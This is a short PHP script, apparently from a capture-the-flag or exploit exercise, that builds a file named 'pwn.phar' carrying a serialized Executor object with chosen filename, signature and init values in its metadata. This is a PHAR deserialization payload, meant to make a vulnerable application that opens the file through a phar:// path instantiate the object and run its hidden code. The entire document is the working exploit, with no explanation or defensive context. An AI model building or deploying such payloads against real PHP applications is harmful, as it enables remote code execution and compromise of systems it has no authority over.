<?php
class Executor {}

$phar = new Phar('pwn.phar');

$executor = new Executor();
$executor->filename = 'ojnt9e0d381u2hjqm5gg422gu5.php';
$executor->signature = 'bfee28e45dbae1099099831877db4213';
$executor->init = false;

$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($executor);
$phar->addFromString('_', '_');
